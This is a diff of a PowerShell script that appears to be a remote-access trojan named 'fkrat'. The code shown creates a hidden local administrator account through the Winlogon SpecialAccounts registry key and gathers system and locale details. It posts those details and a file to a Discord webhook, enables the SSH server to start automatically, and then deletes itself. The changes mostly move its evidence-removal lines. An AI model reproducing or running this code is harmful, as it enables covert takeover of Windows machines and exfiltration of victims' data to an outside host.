@@ -2,7 +2,6 @@
 function randomText {
   return -join ((65..90) + (97..122) | Get-Random -Count 8 | ForEach-Object {[char]$_})
 }
-word
 
 ## Create Local Admin FUNCTION
 function createAdmin {
@@ -55,6 +54,7 @@ $uName = "fkrat"
 $rPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList"
 $group = (((New-Object System.Security.Principal.SecurityIdentifier('S-1-5-32-544')).Translate([System.Security.Principal.NTAccount]).Value) -Split "\\")[1]
 $Webhook = Get-Content ./webhook
+Remove-Item "webhook"
 $language = (Get-WinUserLanguageList)[0].autonym
 $country = ((((Get-WinHomeLocation)[0] | Select-Object HomeLocation) | ConvertTo-Json -Compress -Depth 100)[17..300] -join '') 
 $country = $country.Substring(0, $country.length - 2)
@@ -85,9 +85,9 @@ Get-Item "C:\Users\$uName" -Force | ForEach-Object {$_.Attributes = $_.Attribute
 ## Sends Discord Webhook
 Invoke-RestMethod -Uri $Webhook -Method Post -Body ($payload | ConvertTo-Json) -ContentType 'Application/Json';
 upload_discord("$env:computername.fk")
+Remove-Item "$env:computername.fk" 
 
-
-## goto Temp and make dir 
+## goto Temp and make dir
 Set-Location $temp	
 New-Item -Path $temp -Name $dirName -Type Directory
 Set-Location $dirName
@@ -99,6 +99,4 @@ Set-Service -Name sshd -StartupType 'Automatic'
 Get-NetFirewallRule -Name *ssh*
 
 ## Self Delete
-Remove-Item "webhook"
-Remove-Item "$env:computername.fk"
 Remove-Item $PSCommandPath -Force 
